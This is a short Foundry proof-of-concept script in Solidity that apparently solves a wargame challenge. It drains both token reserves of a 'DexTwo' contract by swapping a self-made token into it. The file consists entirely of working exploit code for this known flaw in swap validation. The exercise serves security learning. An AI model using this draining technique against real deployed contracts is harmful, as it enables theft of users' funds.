// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import {DexTwo} from "../src/Dex2.sol";

contract POC is Script {

    DexTwo public dexTwo;

    function run() external{
        vm.startBroadcast();

        dexTwo = DexTwo(0x4AEC8ebe30f5dBe4402549D998Ae9E2068860CCf);
        address BTN = address(0x659BFCd93A970941C49d54591A117d75042281A6);
        address token1 = dexTwo.token1();
        address token2 = dexTwo.token2();

        dexTwo.swap(BTN, token1, 100);
        dexTwo.swap(BTN, token2, 200);

        console.log("Remaining token1 balance : ", dexTwo.balanceOf(token1, address(dexTwo)));
        console.log("Remaining token2 balance : ", dexTwo.balanceOf(token2, address(dexTwo)));

        vm.stopBroadcast();
    }
}
